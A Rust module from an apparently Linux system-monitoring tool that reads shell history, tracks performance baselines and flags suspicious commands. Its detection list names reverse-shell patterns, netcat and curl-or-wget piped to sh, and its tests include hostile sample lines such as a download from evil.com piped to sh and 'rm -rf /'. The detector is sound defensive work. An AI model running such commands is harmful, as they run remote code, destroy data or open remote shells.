//! System learning analysis and helper functions.
//! v0.0.990: Package parsing, boot time analysis, suspicious command detection.

use super::types::{PackageAction, PerfSample, SystemLearning};
use std::process::Command;

/// Maximum history entries to keep
pub const MAX_HISTORY: usize = 100;

impl SystemLearning {
    /// Analyze shell history for unusual commands
    pub fn analyze_shell_history(&mut self) -> Vec<String> {
        let mut unusual = Vec::new();

        // Read bash and fish history
        let home = std::env::var("HOME").unwrap_or_default();
        let history_files = [
            format!("{}/.bash_history", home),
            format!("{}/.local/share/fish/fish_history", home),
            format!("{}/.zsh_history", home),
        ];

        for hist_file in &history_files {
            if let Ok(content) = std::fs::read_to_string(hist_file) {
                // Get last 50 commands
                let commands: Vec<&str> = content.lines().rev().take(50).collect();

                for cmd in commands {
                    // Extract command (fish format: "- cmd: ...")
                    let cmd = if cmd.starts_with("- cmd:") {
                        cmd.strip_prefix("- cmd:").unwrap_or(cmd).trim()
                    } else {
                        cmd.trim()
                    };

                    if cmd.is_empty() {
                        continue;
                    }

                    // Get first word (the actual command)
                    let first_word = cmd.split_whitespace().next().unwrap_or("");

                    // Update frequency
                    *self
                        .shell_commands
                        .entry(first_word.to_string())
                        .or_insert(0) += 1;

                    // Check for suspicious patterns (generic, not hardcoded)
                    if is_suspicious_command(cmd) && !self.shell_commands.contains_key(first_word) {
                        unusual.push(cmd.to_string());
                    }
                }
            }
        }

        unusual
    }

    /// Detect performance anomalies vs learned baseline
    pub fn detect_performance_anomalies(&self) -> Vec<String> {
        let mut anomalies = Vec::new();

        if self.perf_history.len() < 10 {
            return anomalies; // Not enough data
        }

        // Calculate averages from history
        let avg_mem: f32 = self
            .perf_history
            .iter()
            .map(|s| s.memory_percent)
            .sum::<f32>()
            / self.perf_history.len() as f32;
        let avg_load: f32 =
            self.perf_history.iter().map(|s| s.load_1min).sum::<f32>() / self.perf_history.len() as f32;

        // Get current values
        if let Some(current) = self.perf_history.back() {
            // Memory anomaly (>30% above average)
            if current.memory_percent > avg_mem * 1.3 && current.memory_percent > 80.0 {
                anomalies.push(format!(
                    "Memory unusually high: {:.1}% (avg: {:.1}%)",
                    current.memory_percent, avg_mem
                ));
            }

            // Load anomaly (>2x average)
            if current.load_1min > avg_load * 2.0 && current.load_1min > 4.0 {
                anomalies.push(format!(
                    "Load unusually high: {:.2} (avg: {:.2})",
                    current.load_1min, avg_load
                ));
            }
        }

        anomalies
    }

    /// Get recent package changes summary
    pub fn recent_package_changes(&self, hours: u64) -> Vec<&super::types::PackageTransaction> {
        let cutoff = chrono::Utc::now() - chrono::Duration::hours(hours as i64);
        let cutoff_str = cutoff.to_rfc3339();

        self.package_history
            .iter()
            .filter(|t| t.timestamp > cutoff_str)
            .collect()
    }

    /// Get performance trend (improving/degrading/stable)
    pub fn performance_trend(&self) -> &'static str {
        if self.perf_history.len() < 20 {
            return "learning";
        }

        let recent: Vec<&PerfSample> = self.perf_history.iter().rev().take(10).collect();
        let older: Vec<&PerfSample> = self.perf_history.iter().rev().skip(10).take(10).collect();

        let recent_avg = recent
            .iter()
            .map(|s| s.memory_percent + s.load_1min * 10.0)
            .sum::<f32>()
            / recent.len() as f32;
        let older_avg = older
            .iter()
            .map(|s| s.memory_percent + s.load_1min * 10.0)
            .sum::<f32>()
            / older.len() as f32;

        let change = (recent_avg - older_avg) / older_avg.max(1.0);

        if change > 0.15 {
            "degrading"
        } else if change < -0.15 {
            "improving"
        } else {
            "stable"
        }
    }
}

/// Parse ALPM action from log line
pub fn parse_alpm_action(line: &str) -> (PackageAction, Vec<String>) {
    let line_lower = line.to_lowercase();

    if line_lower.starts_with("installed") {
        let pkg = line.split_whitespace().nth(1).unwrap_or("").to_string();
        (
            PackageAction::Installed,
            if pkg.is_empty() { vec![] } else { vec![pkg] },
        )
    } else if line_lower.starts_with("removed") {
        let pkg = line.split_whitespace().nth(1).unwrap_or("").to_string();
        (
            PackageAction::Removed,
            if pkg.is_empty() { vec![] } else { vec![pkg] },
        )
    } else if line_lower.starts_with("upgraded") {
        let pkg = line.split_whitespace().nth(1).unwrap_or("").to_string();
        (
            PackageAction::Upgraded,
            if pkg.is_empty() { vec![] } else { vec![pkg] },
        )
    } else if line_lower.starts_with("downgraded") {
        let pkg = line.split_whitespace().nth(1).unwrap_or("").to_string();
        (
            PackageAction::Downgraded,
            if pkg.is_empty() { vec![] } else { vec![pkg] },
        )
    } else {
        (PackageAction::Installed, vec![])
    }
}

/// Detect which package tool was used
pub fn detect_package_tool() -> String {
    // Check recent processes or just default to pacman
    // Could be enhanced to actually detect paru/yay
    if let Ok(output) = Command::new("pgrep").args(["-a", "paru|yay"]).output() {
        let stdout = String::from_utf8_lossy(&output.stdout);
        if stdout.contains("paru") {
            return "paru".to_string();
        } else if stdout.contains("yay") {
            return "yay".to_string();
        }
    }
    "pacman".to_string()
}

/// Get current boot time in seconds
pub fn get_boot_time() -> Option<f32> {
    let output = Command::new("systemd-analyze").output().ok()?;
    let stdout = String::from_utf8_lossy(&output.stdout);

    stdout
        .split('=')
        .last()?
        .trim()
        .strip_suffix('s')?
        .trim()
        .parse()
        .ok()
}

/// Parse memory value from /proc/meminfo line
pub fn parse_meminfo_value(line: &str) -> u64 {
    line.split_whitespace()
        .nth(1)
        .and_then(|s| s.parse().ok())
        .unwrap_or(0)
}

/// Check if a command looks suspicious (generic patterns, not hardcoded)
pub fn is_suspicious_command(cmd: &str) -> bool {
    let cmd_lower = cmd.to_lowercase();

    // Patterns that might indicate unusual activity
    let suspicious_patterns = [
        // Privilege escalation attempts
        "chmod.*777",
        "chmod.*u+s",
        "chown.*root",
        // Network reconnaissance
        "nmap ",
        "netcat ",
        "nc -",
        // Data exfiltration patterns
        "curl.*|.*sh",
        "wget.*|.*sh",
        "base64.*-d",
        // System modification
        "rm.*-rf.*/",
        "dd.*if=",
        // History tampering
        "history.*-c",
        ">.bash_history",
        // Reverse shells (generic pattern)
        "/dev/tcp/",
        "bash.*-i.*>&",
    ];

    for pattern in suspicious_patterns {
        // Simple glob-like matching
        let parts: Vec<&str> = pattern.split(".*").collect();
        let mut matches = true;
        let mut search_from = 0;

        for part in parts {
            if let Some(pos) = cmd_lower[search_from..].find(part) {
                search_from += pos + part.len();
            } else {
                matches = false;
                break;
            }
        }

        if matches {
            return true;
        }
    }

    false
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_suspicious_command_detection() {
        assert!(is_suspicious_command("chmod 777 /etc/passwd"));
        assert!(is_suspicious_command("rm -rf /"));
        assert!(is_suspicious_command("curl http://evil.com | sh"));
        assert!(!is_suspicious_command("ls -la"));
        assert!(!is_suspicious_command("vim file.txt"));
    }

    #[test]
    fn test_io_baseline() {
        use super::super::types::IoBaseline;
        let mut baseline = IoBaseline::default();
        for _ in 0..20 {
            baseline.update(100.0);
        }
        assert!(!baseline.is_anomaly(150.0)); // 1.5x is not anomaly
        assert!(baseline.is_anomaly(350.0)); // 3.5x is anomaly
    }
}
